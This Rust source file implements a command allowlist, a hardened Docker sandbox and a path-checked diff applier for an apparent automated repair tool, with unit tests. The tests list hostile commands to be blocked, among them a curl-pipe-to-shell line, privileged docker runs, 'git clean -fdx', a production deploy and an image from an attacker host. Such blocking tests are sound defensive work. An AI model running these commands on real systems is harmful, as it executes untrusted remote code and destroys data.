use std::{
    collections::BTreeMap,
    path::{Component, Path, PathBuf},
    process::Stdio,
    time::{Duration, Instant},
};

use diffy::{
    apply,
    patch_set::{FileOperation, ParseOptions, PatchSet},
};
use serde::{Deserialize, Serialize};
use thiserror::Error;
use tokio::{io::AsyncReadExt, process::Command};

const MAX_CAPTURE_BYTES: usize = 256 * 1024;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ControlledCommand {
    pub program: String,
    pub arguments: Vec<String>,
    pub working_directory: PathBuf,
}

impl ControlledCommand {
    pub fn validate(&self) -> Result<(), CommandPolicyError> {
        if Path::new(&self.program).components().count() != 1 {
            return Err(CommandPolicyError::ProgramPathForbidden);
        }
        validate_relative_directory(&self.working_directory)?;
        if self.arguments.iter().any(|argument| {
            argument.contains('\0') || argument == "--privileged" || argument.starts_with("--mount")
        }) {
            return Err(CommandPolicyError::ForbiddenArgument);
        }

        let subcommand = self.arguments.first().map(String::as_str);
        let permitted = match self.program.as_str() {
            "npm" => matches!(subcommand, Some("ci" | "install" | "test" | "run")),
            "pnpm" | "yarn" => matches!(
                subcommand,
                Some("install" | "build" | "test" | "lint" | "run")
            ),
            "cargo" => matches!(
                subcommand,
                Some("fetch" | "build" | "test" | "check" | "clippy" | "fmt")
            ),
            "corepack" => {
                matches!(subcommand, Some("pnpm" | "yarn"))
                    && matches!(
                        self.arguments.get(1).map(String::as_str),
                        Some("install" | "build" | "test" | "lint" | "run")
                    )
            }
            "git" => matches!(subcommand, Some("diff" | "status")),
            _ => false,
        };
        if !permitted {
            return Err(CommandPolicyError::CommandForbidden);
        }
        Ok(())
    }
}

fn validate_relative_directory(path: &Path) -> Result<(), CommandPolicyError> {
    if path.is_absolute()
        || path.components().any(|part| {
            matches!(
                part,
                Component::ParentDir | Component::RootDir | Component::Prefix(_)
            )
        })
    {
        return Err(CommandPolicyError::WorkspaceEscape);
    }
    Ok(())
}

#[derive(Debug, Clone)]
pub struct CommandExecutor {
    workspace: PathBuf,
    timeout: Duration,
}

impl CommandExecutor {
    pub fn new(workspace: PathBuf, timeout: Duration) -> Result<Self, CommandPolicyError> {
        if !workspace.is_absolute() {
            return Err(CommandPolicyError::WorkspaceMustBeAbsolute);
        }
        Ok(Self { workspace, timeout })
    }

    pub async fn run(&self, specification: &ControlledCommand) -> Result<CommandOutput, RunError> {
        specification.validate()?;
        let working_directory = self.workspace.join(&specification.working_directory);
        if !working_directory.starts_with(&self.workspace) {
            return Err(CommandPolicyError::WorkspaceEscape.into());
        }

        let started = Instant::now();
        let mut process = Command::new(&specification.program);
        process
            .args(&specification.arguments)
            .current_dir(working_directory)
            .env_clear()
            .envs(safe_environment())
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        let mut child = process.spawn()?;
        let mut stdout = child.stdout.take().ok_or(RunError::OutputUnavailable)?;
        let mut stderr = child.stderr.take().ok_or(RunError::OutputUnavailable)?;
        let stdout_task = tokio::spawn(async move { read_bounded(&mut stdout).await });
        let stderr_task = tokio::spawn(async move { read_bounded(&mut stderr).await });
        let status = match tokio::time::timeout(self.timeout, child.wait()).await {
            Ok(result) => result?,
            Err(_) => {
                child.kill().await?;
                return Err(RunError::TimedOut);
            }
        };
        let stdout = stdout_task
            .await
            .map_err(|_| RunError::OutputUnavailable)??;
        let stderr = stderr_task
            .await
            .map_err(|_| RunError::OutputUnavailable)??;
        Ok(CommandOutput {
            exit_code: status.code(),
            duration_ms: started.elapsed().as_millis(),
            stdout,
            stderr,
        })
    }
}

fn safe_environment() -> BTreeMap<String, String> {
    ["PATH", "Path", "SYSTEMROOT", "TEMP", "TMP"]
        .into_iter()
        .filter_map(|name| {
            std::env::var(name)
                .ok()
                .map(|value| (name.to_owned(), value))
        })
        .collect()
}

async fn read_bounded(reader: &mut (impl AsyncReadExt + Unpin)) -> Result<String, std::io::Error> {
    let mut captured = Vec::new();
    let mut chunk = [0_u8; 8192];
    loop {
        let read = reader.read(&mut chunk).await?;
        if read == 0 {
            break;
        }
        let remaining = MAX_CAPTURE_BYTES.saturating_sub(captured.len());
        captured.extend_from_slice(&chunk[..read.min(remaining)]);
    }
    Ok(String::from_utf8_lossy(&captured).into_owned())
}

#[derive(Debug, Clone)]
pub struct DockerSandbox {
    docker_program: PathBuf,
    workspace: PathBuf,
    image: String,
    timeout: Duration,
    memory_mb: u32,
    cpus: f32,
    pids_limit: u32,
    network_enabled: bool,
    container_user: String,
    volume_mount: Option<(String, PathBuf)>,
}

impl DockerSandbox {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        docker_program: PathBuf,
        workspace: PathBuf,
        image: String,
        timeout: Duration,
        memory_mb: u32,
        cpus: f32,
        pids_limit: u32,
        network_enabled: bool,
    ) -> Result<Self, CommandPolicyError> {
        if !workspace.is_absolute() {
            return Err(CommandPolicyError::WorkspaceMustBeAbsolute);
        }
        if !is_allowed_image(&image) {
            return Err(CommandPolicyError::ImageForbidden);
        }
        if !(128..=16_384).contains(&memory_mb)
            || !(0.1..=8.0).contains(&cpus)
            || !(16..=4096).contains(&pids_limit)
        {
            return Err(CommandPolicyError::InvalidResourceLimit);
        }
        Ok(Self {
            docker_program,
            workspace,
            image,
            timeout,
            memory_mb,
            cpus,
            pids_limit,
            network_enabled,
            container_user: "65532:65532".into(),
            volume_mount: None,
        })
    }

    pub fn with_container_user(
        mut self,
        user: impl Into<String>,
    ) -> Result<Self, CommandPolicyError> {
        let user = user.into();
        if user.is_empty()
            || !user
                .chars()
                .all(|character| character.is_ascii_digit() || character == ':')
        {
            return Err(CommandPolicyError::InvalidContainerUser);
        }
        self.container_user = user;
        Ok(self)
    }

    pub fn with_volume_mount(
        mut self,
        volume: impl Into<String>,
        subpath: PathBuf,
    ) -> Result<Self, CommandPolicyError> {
        let volume = volume.into();
        if volume.is_empty()
            || !volume.chars().all(|character| {
                character.is_ascii_alphanumeric() || matches!(character, '_' | '-' | '.')
            })
        {
            return Err(CommandPolicyError::InvalidVolumeMount);
        }
        validate_relative_directory(&subpath)?;
        if subpath.as_os_str().is_empty() {
            return Err(CommandPolicyError::InvalidVolumeMount);
        }
        self.volume_mount = Some((volume, subpath));
        Ok(self)
    }

    pub async fn run(&self, specification: &ControlledCommand) -> Result<CommandOutput, RunError> {
        specification.validate()?;
        let args = self.docker_arguments(specification)?;
        run_process(
            &self.docker_program,
            &args,
            &self.workspace,
            self.timeout,
            false,
        )
        .await
    }

    fn docker_arguments(
        &self,
        specification: &ControlledCommand,
    ) -> Result<Vec<String>, CommandPolicyError> {
        let mount = if let Some((volume, subpath)) = &self.volume_mount {
            format!(
                "--mount=type=volume,src={volume},dst=/workspace,volume-subpath={}",
                subpath.to_string_lossy().replace('\\', "/")
            )
        } else {
            let mount_source = self.workspace.to_string_lossy();
            if mount_source.contains(',') {
                return Err(CommandPolicyError::WorkspaceEscape);
            }
            format!("--mount=type=bind,src={mount_source},dst=/workspace")
        };
        let container_workdir = if specification.working_directory.as_os_str().is_empty() {
            "/workspace".to_owned()
        } else {
            format!(
                "/workspace/{}",
                specification
                    .working_directory
                    .to_string_lossy()
                    .replace('\\', "/")
            )
        };
        let mut args = vec![
            "run".into(),
            "--rm".into(),
            "--init".into(),
            "--cap-drop=ALL".into(),
            "--security-opt=no-new-privileges:true".into(),
            "--read-only".into(),
            format!("--memory={}m", self.memory_mb),
            format!("--cpus={}", self.cpus),
            format!("--pids-limit={}", self.pids_limit),
            format!("--user={}", self.container_user),
            format!(
                "--network={}",
                if self.network_enabled {
                    "bridge"
                } else {
                    "none"
                }
            ),
            mount,
            "--tmpfs=/tmp:rw,noexec,nosuid,size=256m".into(),
            "--env=HOME=/tmp".into(),
            "--env=CARGO_HOME=/workspace/.nopager-cache/cargo".into(),
            "--env=COREPACK_HOME=/workspace/.nopager-cache/corepack".into(),
            "--workdir".into(),
            container_workdir,
            self.image.clone(),
            specification.program.clone(),
        ];
        args.extend(specification.arguments.iter().cloned());
        Ok(args)
    }
}

fn is_allowed_image(image: &str) -> bool {
    const ALLOWED_PREFIXES: &[&str] = &["node:", "rust:"];
    ALLOWED_PREFIXES
        .iter()
        .any(|prefix| image.starts_with(prefix))
        && !image.contains('@')
        && !image.contains('/')
}

pub fn apply_unified_diff(
    workspace: &Path,
    unified_diff: &str,
) -> Result<Vec<PathBuf>, PatchError> {
    if !workspace.is_absolute() {
        return Err(PatchError::UnsafePath("workspace must be absolute".into()));
    }
    let canonical_workspace = workspace.canonicalize()?;
    let mut writes = Vec::new();
    for file_patch in PatchSet::parse(unified_diff, ParseOptions::gitdiff()) {
        let file_patch = file_patch.map_err(|error| PatchError::InvalidPatch(error.to_string()))?;
        let operation = file_patch.operation().strip_prefix(1);
        let path = match operation {
            FileOperation::Create(path) => PathBuf::from(path.as_ref()),
            FileOperation::Modify { original, modified } if original == modified => {
                PathBuf::from(modified.as_ref())
            }
            FileOperation::Delete(_)
            | FileOperation::Rename { .. }
            | FileOperation::Copy { .. }
            | FileOperation::Modify { .. } => return Err(PatchError::DestructiveOperation),
        };
        validate_relative_directory(&path)
            .map_err(|_| PatchError::UnsafePath(path.display().to_string()))?;
        let destination = canonical_workspace.join(&path);
        let parent = destination
            .parent()
            .ok_or_else(|| PatchError::UnsafePath(path.display().to_string()))?;
        let canonical_parent = nearest_existing_parent(parent)?.canonicalize()?;
        if !canonical_parent.starts_with(&canonical_workspace) {
            return Err(PatchError::UnsafePath(path.display().to_string()));
        }
        if destination.exists()
            && !destination
                .canonicalize()?
                .starts_with(&canonical_workspace)
        {
            return Err(PatchError::UnsafePath(path.display().to_string()));
        }
        let base = if destination.exists() {
            std::fs::read_to_string(&destination)?
        } else {
            String::new()
        };
        let text_patch = file_patch
            .patch()
            .as_text()
            .ok_or(PatchError::BinaryPatchForbidden)?;
        let updated = apply(&base, text_patch)
            .map_err(|error| PatchError::InvalidPatch(error.to_string()))?;
        writes.push((path, destination, updated));
    }
    if writes.is_empty() {
        return Err(PatchError::InvalidPatch("patch contains no files".into()));
    }
    for (_, destination, contents) in &writes {
        if let Some(parent) = destination.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(destination, contents)?;
    }
    Ok(writes.into_iter().map(|(path, _, _)| path).collect())
}

fn nearest_existing_parent(path: &Path) -> Result<&Path, PatchError> {
    let mut current = path;
    while !current.exists() {
        current = current
            .parent()
            .ok_or_else(|| PatchError::UnsafePath(path.display().to_string()))?;
    }
    Ok(current)
}

#[derive(Debug, Error)]
pub enum PatchError {
    #[error("patch contains an unsafe path: {0}")]
    UnsafePath(String),
    #[error("patch contains a delete, rename, copy, or cross-path modification")]
    DestructiveOperation,
    #[error("binary patches are forbidden")]
    BinaryPatchForbidden,
    #[error("invalid unified diff: {0}")]
    InvalidPatch(String),
    #[error(transparent)]
    Io(#[from] std::io::Error),
}

async fn run_process(
    program: &Path,
    arguments: &[String],
    working_directory: &Path,
    timeout: Duration,
    inherit_environment: bool,
) -> Result<CommandOutput, RunError> {
    let started = Instant::now();
    let mut process = Command::new(program);
    process
        .args(arguments)
        .current_dir(working_directory)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    if !inherit_environment {
        process.env_clear().envs(safe_environment());
    }
    let mut child = process.spawn()?;
    let mut stdout = child.stdout.take().ok_or(RunError::OutputUnavailable)?;
    let mut stderr = child.stderr.take().ok_or(RunError::OutputUnavailable)?;
    let stdout_task = tokio::spawn(async move { read_bounded(&mut stdout).await });
    let stderr_task = tokio::spawn(async move { read_bounded(&mut stderr).await });
    let status = match tokio::time::timeout(timeout, child.wait()).await {
        Ok(result) => result?,
        Err(_) => {
            child.kill().await?;
            return Err(RunError::TimedOut);
        }
    };
    Ok(CommandOutput {
        exit_code: status.code(),
        duration_ms: started.elapsed().as_millis(),
        stdout: stdout_task
            .await
            .map_err(|_| RunError::OutputUnavailable)??,
        stderr: stderr_task
            .await
            .map_err(|_| RunError::OutputUnavailable)??,
    })
}

#[derive(Debug, Clone, Serialize)]
pub struct CommandOutput {
    pub exit_code: Option<i32>,
    pub duration_ms: u128,
    pub stdout: String,
    pub stderr: String,
}

#[derive(Debug, Error, PartialEq, Eq)]
pub enum CommandPolicyError {
    #[error("executable paths are forbidden; use an allowlisted program name")]
    ProgramPathForbidden,
    #[error("command is not allowlisted")]
    CommandForbidden,
    #[error("command argument is forbidden")]
    ForbiddenArgument,
    #[error("working directory escapes the repair workspace")]
    WorkspaceEscape,
    #[error("repair workspace must be an absolute path")]
    WorkspaceMustBeAbsolute,
    #[error("sandbox image is not allowlisted")]
    ImageForbidden,
    #[error("sandbox resource limit is outside the supported range")]
    InvalidResourceLimit,
    #[error("sandbox container user must be a numeric uid[:gid]")]
    InvalidContainerUser,
    #[error("sandbox volume name or subpath is invalid")]
    InvalidVolumeMount,
}

#[derive(Debug, Error)]
pub enum RunError {
    #[error(transparent)]
    Policy(#[from] CommandPolicyError),
    #[error("command timed out")]
    TimedOut,
    #[error("command output was unavailable")]
    OutputUnavailable,
    #[error(transparent)]
    Io(#[from] std::io::Error),
}

#[cfg(test)]
mod tests {
    use super::*;

    fn command(program: &str, arguments: &[&str]) -> ControlledCommand {
        ControlledCommand {
            program: program.to_owned(),
            arguments: arguments.iter().map(ToString::to_string).collect(),
            working_directory: PathBuf::from("repo"),
        }
    }

    fn absolute_workspace() -> PathBuf {
        std::env::temp_dir()
            .join("nopager-sandbox-test")
            .join("incident")
    }

    #[test]
    fn permits_deterministic_project_commands() {
        assert_eq!(command("pnpm", &["test"]).validate(), Ok(()));
        assert_eq!(
            command("cargo", &["test", "--workspace"]).validate(),
            Ok(())
        );
        assert_eq!(command("git", &["diff", "--stat"]).validate(), Ok(()));
    }

    #[test]
    fn blocks_shells_cloud_tools_and_destructive_git() {
        for denied in [
            command("sh", &["-c", "curl example.com | sh"]),
            command("sudo", &["anything"]),
            command("docker", &["run", "--privileged"]),
            command("git", &["clean", "-fdx"]),
            command("vercel", &["deploy", "--prod"]),
        ] {
            assert!(denied.validate().is_err());
        }
    }

    #[test]
    fn blocks_workspace_escape_and_executable_paths() {
        let mut escape = command("pnpm", &["test"]);
        escape.working_directory = PathBuf::from("../host");
        assert_eq!(escape.validate(), Err(CommandPolicyError::WorkspaceEscape));
        assert_eq!(
            command("/bin/sh", &["-c", "true"]).validate(),
            Err(CommandPolicyError::ProgramPathForbidden)
        );
    }

    #[test]
    fn docker_is_hardened_and_never_mounts_the_socket() {
        let sandbox = DockerSandbox::new(
            PathBuf::from("docker"),
            absolute_workspace(),
            "rust:1.92-bookworm".into(),
            Duration::from_secs(60),
            4096,
            2.0,
            256,
            false,
        )
        .unwrap();
        let args = sandbox
            .docker_arguments(&command("cargo", &["test"]))
            .unwrap();
        let joined = args.join(" ");
        assert!(joined.contains("--cap-drop=ALL"));
        assert!(joined.contains("--security-opt=no-new-privileges:true"));
        assert!(joined.contains("--network=none"));
        assert!(!joined.contains("docker.sock"));
        assert!(!joined.contains("--privileged"));
    }

    #[test]
    fn docker_rejects_untrusted_images() {
        assert!(!is_allowed_image("attacker.example/image:latest"));
        assert!(!is_allowed_image("node@sha256:bad"));
        assert!(is_allowed_image("node:24-bookworm"));
    }

    #[test]
    fn volume_mount_is_scoped_to_one_incident_workspace() {
        let sandbox = DockerSandbox::new(
            PathBuf::from("docker"),
            absolute_workspace(),
            "node:24-bookworm".into(),
            Duration::from_secs(60),
            2048,
            1.0,
            128,
            false,
        )
        .unwrap()
        .with_volume_mount("nopager-workspaces", PathBuf::from("incident/attempt"))
        .unwrap();
        let args = sandbox
            .docker_arguments(&command("pnpm", &["test"]))
            .unwrap();
        assert!(args.iter().any(|argument| argument == "--mount=type=volume,src=nopager-workspaces,dst=/workspace,volume-subpath=incident/attempt"));
    }

    #[test]
    fn applies_safe_multi_file_patch_and_blocks_deletion() {
        let root = std::env::temp_dir().join(format!("nopager-patch-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("a.txt"), "old\n").unwrap();
        let patch = "diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-old\n+new\ndiff --git a/b.txt b/b.txt\nnew file mode 100644\n--- /dev/null\n+++ b/b.txt\n@@ -0,0 +1 @@\n+created\n";
        assert_eq!(
            apply_unified_diff(&root, patch).unwrap(),
            [PathBuf::from("a.txt"), PathBuf::from("b.txt")]
        );
        assert_eq!(
            std::fs::read_to_string(root.join("a.txt")).unwrap(),
            "new\n"
        );
        let deletion = "diff --git a/a.txt b/a.txt\ndeleted file mode 100644\n--- a/a.txt\n+++ /dev/null\n@@ -1 +0,0 @@\n-new\n";
        assert!(matches!(
            apply_unified_diff(&root, deletion),
            Err(PatchError::DestructiveOperation)
        ));
        let _ = std::fs::remove_dir_all(root);
    }
}
